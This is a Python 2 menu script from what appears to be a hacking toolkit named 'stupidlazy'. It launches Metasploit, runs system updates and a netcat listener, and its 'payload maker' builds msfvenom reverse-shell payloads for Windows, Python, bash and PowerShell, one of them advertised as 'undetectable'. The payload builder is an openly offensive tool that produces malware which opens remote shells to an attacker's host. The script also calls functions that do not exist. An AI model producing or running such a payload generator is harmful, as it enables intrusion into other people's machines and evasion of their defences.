#!/bin/usr/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import colorama
from colorama import Fore, Back, init
import socket

def optiona1():
	os.system("clear")
	print("PLEASE WAIT...")
	os.system("msfconsole")

def optiona22():
	try:
		upgq = raw_input("Do you want to upgrade the packeges? yes/no :")
		if upgq	== "yes":
			os.system("xterm -e sudo apt-get upgrade")
			os.system("clear")
			print("ALL PACKEGES UPDATED, GOING BACK TO THE MAIN MENU")
			time.sleep(2)
			os.system("python page2.py")
		elif upgq == "no":
			os.system("python page2.py")            
		else:
			print("Error, this options ins't valid")
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		option22()



def optiona2():
	try:
		os.system("clear")
		print("CHECKING FOR UPDATES, PLEASE WAIT")
		os.system("apt-get update")
		os.system("clear")
		print("PACKEGES THAT CAN BE UPGRADED! ")
		upg = os.system("apt list --upgradable")
		optiona22()
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		time.sleep(2)
		option2()


def optiona3():
	try:
		ncl = input("What port you want to listen? : ")
		os.system("clear")
		os.system('sudo gnome-terminal -x bash -c "echo TYPE ANYTHING HERE TO TEST CONNECTIVITY && nc %s %s" 2> /dev/null | nc -l -p %s'%(host, ncl, ncl))
		os.system("python page2.py")
	except KeyboardInterrupt:
		print("\nListener stoped...")



def optiona4():
	try:
		os.system("clear")
		os.system("figlet PAYLOAD MAKER")
		print("1 -- windows/meterpreter/reverse_tcp (PAYLOAD REVERSE SHELL .EXE)")
		print("2 -- cmd/unix/reverse_python (PAYLOAD REVERSE SHELL .PY)")
		print("3 -- cmd/unix/reverse_bash (PAYLOAD REVERSE SHELL .SH)")
		print("4 -- msfvenom -p windows/powershell_reverse_tcp (UNDETECTABLE PAYLOAD REVERSE SHELL .EXE)")
		choosemsf = input("Choose one option: ")
		hostmsf = raw_input("Select the local host (%s) : "%address)
		s.close()
		chooseportmsf = input("Select one listen port: ")
		namemsf = raw_input("Select the name of your payload : ")
		
		if choosemsf == 1:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
		if choosemsf == 2:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
		if choosemsf == 3:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
		if choosemsf == 4:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/powershell_reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
	except KeyboardInterrupt:
		print("\nAborting...")
		time.sleep(2)
		os.system("python page2.py")

host = socket.gethostname()
ip = socket.gethostbyname(host)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 1))
address = s.getsockname()[0]

try:
	os.system("clear")
	os.system("figlet PAGE2")
	print("")
	print("a1 -- START MSFCONSOLE			    a2 -- AUTOMATIC UPDATE YOU MACHINE")
	print("a3 -- TEST CONNECTIVITY WITH NETCAT  	    a4 -- MAKE A PAYLOAD")
	print("a100 -- GO BACK TO STUPIDLAZY")
	print("")
	choose = raw_input("Select one option : ")

	if choose == "a1":
		optiona1()
		os.system("python page2.py")

	elif choose == "a2":
		optiona2()
		
	elif choose == "a3":
		optiona3()

	elif choose == "a4":
		optiona4()

	elif choose == "a100":
		os.system("python stupidlazy.py")
	else:
		print("This option does not exists")
		time.sleep(2)
		os.system("python page2.py")

except KeyboardInterrupt:
	os.system("python stupidlazy.py")
